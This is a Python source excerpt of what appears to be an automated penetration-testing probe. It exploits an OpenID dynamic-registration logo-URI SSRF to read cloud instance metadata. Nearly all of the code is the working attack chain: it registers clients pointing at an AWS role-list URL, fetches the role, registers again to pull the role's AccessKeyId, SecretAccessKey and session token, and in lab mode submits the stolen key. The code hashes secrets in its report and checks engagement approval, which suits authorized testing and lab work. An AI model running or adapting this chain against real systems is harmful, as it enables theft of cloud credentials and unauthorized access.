    @staticmethod
    def _add_evidence(
        evidence_steps: List[Dict[str, Any]],
        label: str,
        method: str,
        url: str,
        body: str,
        content_type: str,
        response: Dict[str, Any],
        secret_values: Iterable[Any],
    ) -> None:
        if response.get("redirected"):
            raise OAuthProbeError(f"{label} unexpectedly followed a redirect")
        step = build_http_evidence_step(
            label,
            method,
            url,
            body,
            content_type,
            response,
            secret_values,
        )
        if step["responseExcerptTruncated"]:
            raise OAuthProbeError(f"{label} evidence was truncated")
        evidence_steps.append(step)

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        provider_origin = _normalized_origin(parameters["providerOrigin"], https_only=True)
        assert target is not None and provider_origin is not None
        target_origin = _origin_from_url(target)
        assert target_origin is not None
        proof_level = str(parameters["proofLevel"]).lower()
        engagement = str(parameters["engagement"]).lower()
        timeout = int(parameters.get("timeoutSeconds") or 15)
        oauth_entry_path = str(parameters["oauthEntryPath"])
        callback_path = str(parameters["callbackPath"])
        logo_template = str(parameters["logoFetchPathTemplate"])
        callback_url = urljoin(target, callback_path)
        oauth_entry_url = urljoin(target, oauth_entry_path)
        discovery_url = provider_origin + OIDC_DISCOVERY_PATH

        request_count = 0
        baseline_requests = 0
        discovery_requests = 0
        registration_requests = 0
        created_artifacts = 0
        logo_fetch_requests = 0
        effect_requests = 0
        solved_checks = 0
        evidence_steps: List[Dict[str, Any]] = []
        secret_values: List[Any] = []
        statuses: Dict[str, int] = {}

        nonce = secrets.token_hex(8)
        role_list_name = f"xasm-oauth-{nonce}-role-list"
        role_credentials_name = f"xasm-oauth-{nonce}-role-credentials"

        try:
            target_addresses, provider_addresses = await asyncio.gather(
                _resolve_public_addresses(target),
                _resolve_public_addresses(provider_origin),
            )
            target_host = urlsplit(target).hostname
            provider_host = urlsplit(provider_origin).hostname
            assert target_host and provider_host
            pins: Dict[str, List[Tuple[str, int]]] = {
                target_host.lower(): target_addresses,
                provider_host.lower(): provider_addresses,
            }
            resolver = PinnedPublicResolver(pins)
            connector = aiohttp.TCPConnector(
                resolver=resolver,
                use_dns_cache=True,
                ttl_dns_cache=300,
                ssl=True,
            )
            timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                connector=connector,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                if proof_level == "lab-state-change":
                    status_url = urljoin(target, str(parameters["statusPath"]))
                    baseline = await self._request(session, "GET", status_url)
                    request_count += 1
                    baseline_requests += 1
                    statuses["baselineStatus"] = int(baseline.get("status") or 0)
                    _assert_response(
                        baseline,
                        label="unsolved baseline",
                        allowed_statuses=(200,),
                    )
                    if (
                        not _response_has_marker(baseline, str(parameters["unsolvedMarker"]))
                        or _response_has_marker(baseline, str(parameters["solvedMarker"]))
                    ):
                        raise OAuthProbeError(
                            "unsolved baseline did not prove a fresh unsolved state"
                        )
                    self._add_evidence(
                        evidence_steps,
                        "unsolved-baseline",
                        "GET",
                        status_url,
                        "",
                        "",
                        baseline,
                        secret_values,
                    )

                provider_redirect = await self._request(
                    session,
                    "GET",
                    oauth_entry_url,
                )
                request_count += 1
                discovery_requests += 1
                statuses["oauthEntryStatus"] = int(provider_redirect.get("status") or 0)
                provider_location = extract_oauth_provider_location(provider_redirect)
                redirect_proof = parse_oauth_provider_redirect(
                    provider_location,
                    target_origin,
                    provider_origin,
                    callback_url,
                )
                secret_values.append(redirect_proof["clientId"])
                self._add_evidence(
                    evidence_steps,
                    "oauth-provider-redirect",
                    "GET",
                    oauth_entry_url,
                    "",
                    "",
                    provider_redirect,
                    secret_values,
                )

                discovery = await self._request(session, "GET", discovery_url)
                request_count += 1
                discovery_requests += 1
                statuses["oidcDiscoveryStatus"] = int(discovery.get("status") or 0)
                _assert_response(
                    discovery,
                    label="OIDC discovery",
                    allowed_statuses=(200,),
                )
                registration_endpoint = parse_oidc_discovery(
                    str(discovery.get("body") or ""),
                    provider_origin,
                )
                self._add_evidence(
                    evidence_steps,
                    "oidc-discovery",
                    "GET",
                    discovery_url,
                    "",
                    "",
                    discovery,
                    secret_values,
                )

                role_list_body = build_registration_body(
                    role_list_name,
                    callback_url,
                    AWS_ROLE_LIST_URL,
                )
                role_registration = await self._request(
                    session,
                    "POST",
                    registration_endpoint,
                    role_list_body,
                    "application/json",
                )
                request_count += 1
                registration_requests += 1
                statuses["roleListRegistrationStatus"] = int(
                    role_registration.get("status") or 0
                )
                _assert_response(
                    role_registration,
                    label="role-list registration",
                    allowed_statuses=(200, 201),
                )
                role_client_id, role_registration_secrets = parse_registration_response(
                    str(role_registration.get("body") or "")
                )
                created_artifacts += 1
                secret_values.extend(role_registration_secrets)
                self._add_evidence(
                    evidence_steps,
                    "role-list-registration",
                    "POST",
                    registration_endpoint,
                    role_list_body,
                    "application/json",
                    role_registration,
                    secret_values,
                )

                role_logo_path = logo_template.replace(
                    "{client_id}",
                    quote(role_client_id, safe=""),
                )
                role_logo_url = provider_origin + role_logo_path
                role_fetch = await self._request(session, "GET", role_logo_url)
                request_count += 1
                logo_fetch_requests += 1
                statuses["roleListFetchStatus"] = int(role_fetch.get("status") or 0)
                _assert_response(
                    role_fetch,
                    label="role-list fetch",
                    allowed_statuses=(200,),
                )
                role = parse_single_role(str(role_fetch.get("body") or ""))
                secret_values.append(role)
                self._add_evidence(
                    evidence_steps,
                    "role-list-fetch",
                    "GET",
                    role_logo_url,
                    "",
                    "",
                    role_fetch,
                    secret_values,
                )

                role_credentials_url = (
                    AWS_ROLE_LIST_URL + quote(role, safe="") + "/"
                )
                role_credentials_body = build_registration_body(
                    role_credentials_name,
                    callback_url,
                    role_credentials_url,
                )
                credentials_registration = await self._request(
                    session,
                    "POST",
                    registration_endpoint,
                    role_credentials_body,
                    "application/json",
                )
                request_count += 1
                registration_requests += 1
                statuses["roleCredentialsRegistrationStatus"] = int(
                    credentials_registration.get("status") or 0
                )
                _assert_response(
                    credentials_registration,
                    label="role-credentials registration",
                    allowed_statuses=(200, 201),
                )
                credentials_client_id, credential_registration_secrets = (
                    parse_registration_response(
                        str(credentials_registration.get("body") or "")
                    )
                )
                if credentials_client_id == role_client_id:
                    raise OAuthProbeError(
                        "dynamic registrations returned the same client artifact"
                    )
                created_artifacts += 1
                secret_values.extend(credential_registration_secrets)
                self._add_evidence(
                    evidence_steps,
                    "role-credentials-registration",
                    "POST",
                    registration_endpoint,
                    role_credentials_body,
                    "application/json",
                    credentials_registration,
                    secret_values,
                )

                credentials_logo_path = logo_template.replace(
                    "{client_id}",
                    quote(credentials_client_id, safe=""),
                )
                credentials_logo_url = provider_origin + credentials_logo_path
                credentials_fetch = await self._request(
                    session,
                    "GET",
                    credentials_logo_url,
                )
                request_count += 1
                logo_fetch_requests += 1
                statuses["roleCredentialsFetchStatus"] = int(
                    credentials_fetch.get("status") or 0
                )
                _assert_response(
                    credentials_fetch,
                    label="role-credentials fetch",
                    allowed_statuses=(200,),
                )
                credentials = parse_credential_document(
                    str(credentials_fetch.get("body") or "")
                )
                secret_values.extend(credentials.values())
                self._add_evidence(
                    evidence_steps,
                    "role-credentials-fetch",
                    "GET",
                    credentials_logo_url,
                    "",
                    "",
                    credentials_fetch,
                    secret_values,
                )

                if proof_level == "lab-state-change":
                    solution_url = urljoin(target, str(parameters["solutionPath"]))
                    solution_body = urlencode(
                        {"answer": credentials["SecretAccessKey"]}
                    )
                    solution = await self._request(
                        session,
                        "POST",
                        solution_url,
                        solution_body,
                        "application/x-www-form-urlencoded",
                    )
                    request_count += 1
                    effect_requests += 1
                    statuses["solutionSubmitStatus"] = int(
                        solution.get("status") or 0
                    )
                    _assert_response(
                        solution,
                        label="approved solution submit",
                        allowed_statuses=(200,),
                    )
                    solution_document = _strict_json_object(
                        str(solution.get("body") or ""),
                        "solution response",
                    )
                    if solution_document.get("correct") is not True:
                        raise OAuthProbeError(
                            "approved solution submit was not accepted"
                        )
                    self._add_evidence(
                        evidence_steps,
                        "approved-solution-submit",
                        "POST",
                        solution_url,
                        solution_body,
                        "application/x-www-form-urlencoded",
                        solution,
                        secret_values,
                    )

                    status_url = urljoin(target, str(parameters["statusPath"]))
                    solved = await self._request(session, "GET", status_url)
                    request_count += 1
                    solved_checks += 1
                    statuses["solvedConfirmationStatus"] = int(
                        solved.get("status") or 0
                    )
                    _assert_response(
                        solved,
                        label="solved confirmation",
                        allowed_statuses=(200,),
                    )
                    if (
                        not _response_has_marker(solved, str(parameters["solvedMarker"]))
                        or _response_has_marker(solved, str(parameters["unsolvedMarker"]))
                    ):
                        raise OAuthProbeError(
                            "post-effect status did not prove the solved transition"
                        )
                    self._add_evidence(
                        evidence_steps,
                        "solved-confirmation",
                        "GET",
                        status_url,
                        "",
                        "",
                        solved,
                        secret_values,
                    )
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": _safe_error_text(exc, secret_values),
                "requestCount": request_count,
                "baselineRequests": baseline_requests,
                "discoveryRequests": discovery_requests,
                "registrationRequests": registration_requests,
                "logoFetchRequests": logo_fetch_requests,
                "effectRequests": effect_requests,
                "solvedChecks": solved_checks,
                "createdArtifacts": created_artifacts,
                "cleanupAvailable": False,
                "cleanupAttempted": False,
                "findings": [],
            }

        verification: Dict[str, Any] = {
            "verified": True,
            "fallback": False,
            "mode": "openid-dynamic-registration-logo-ssrf-v1",
            "proofLevel": proof_level,
            "target": target,
            "providerOrigin": provider_origin,
            "providerOriginAuthorized": True,
            "providerOriginDerived": True,
            "registrationEndpointSameOrigin": True,
            "registrationEndpoint": registration_endpoint,
            "dnsPublicValidated": True,
            "dnsPinned": True,
            "redirectsFollowed": False,
            "engagement": engagement,
            "allowUnsafeMethods": True,
            "dynamicRegistrationApproved": True,
            "sensitiveMetadataReadApproved": True,
            "stateChangeApproved": True,
            "createdArtifacts": 2,
            "cleanupAvailable": False,
            "cleanupAttempted": False,
            "requestCount": request_count,
            "baselineRequests": baseline_requests,
            "discoveryRequests": discovery_requests,
            "registrationRequests": registration_requests,
            "logoFetchRequests": logo_fetch_requests,
            "effectRequests": effect_requests,
            "solvedChecks": solved_checks,
            "oauthEntryPath": oauth_entry_path,
            "callbackPath": callback_path,
            "logoFetchPathTemplate": logo_template,
            "roleListFetched": True,
            "singleRoleSelected": True,
            "credentialsShapeVerified": True,
            "secretMaterialRedacted": True,
            "roleSha256": _sha256_text(role),
            "roleLength": len(role.encode("utf-8")),
            "clientProof": [
                {
                    "sha256": _sha256_text(role_client_id),
                    "length": len(role_client_id.encode("utf-8")),
                },
                {
                    "sha256": _sha256_text(credentials_client_id),
                    "length": len(credentials_client_id.encode("utf-8")),
                },
            ],
            "credentialProof": {
                "accessKeyIdSha256": _sha256_text(credentials["AccessKeyId"]),
                "accessKeyIdLength": len(credentials["AccessKeyId"].encode("utf-8")),
                "secretAccessKeySha256": _sha256_text(
                    credentials["SecretAccessKey"]
                ),
                "secretAccessKeyLength": len(
                    credentials["SecretAccessKey"].encode("utf-8")
                ),
                "sessionTokenPresent": "Token" in credentials,
                "sessionTokenSha256": (
                    _sha256_text(credentials["Token"]) if "Token" in credentials else ""
                ),
                "sessionTokenLength": (
                    len(credentials["Token"].encode("utf-8"))
                    if "Token" in credentials
                    else 0
                ),
            },
            **statuses,
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        if proof_level == "lab-state-change":
            verification.update(
                {
                    "statusPath": str(parameters["statusPath"]),
                    "solutionPath": str(parameters["solutionPath"]),
                    "unsolvedMarker": str(parameters["unsolvedMarker"]),
                    "solvedMarker": str(parameters["solvedMarker"]),
                    "submittedAnswerSha256": _sha256_text(
                        credentials["SecretAccessKey"]
                    ),
                    "submittedAnswerLength": len(
                        credentials["SecretAccessKey"].encode("utf-8")
                    ),
                    "solvedBefore": False,
                    "effectTriggered": True,
                    "solvedAfter": True,
                }
            )
        else:
            verification.update(
                {
                    "solvedBefore": None,
                    "effectTriggered": False,
                    "solvedAfter": None,
                }
            )

        finding = build_nuclei_finding(target, verification)
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "requestCount": request_count,
            "verification": verification,
            "findings": [finding],
        }


def get_tool() -> OAuthProbeTool:
    return OAuthProbeTool()
